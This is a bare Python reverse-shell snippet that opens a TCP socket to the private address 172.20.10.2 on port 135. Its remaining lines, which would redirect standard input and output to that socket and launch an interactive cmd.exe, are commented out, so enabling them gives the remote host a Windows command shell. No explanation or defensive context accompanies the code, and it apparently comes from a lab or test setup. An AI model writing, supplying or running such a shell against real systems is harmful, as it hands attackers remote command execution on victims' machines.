import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s.connect(("172.20.10.2", 135));
#os.dup2(s.fileno(),0);
#os.dup2(s.fileno(),1);
#os.dup2(s.fileno(),2);
#p=subprocess.call(["cmd.exe", "-i"]);
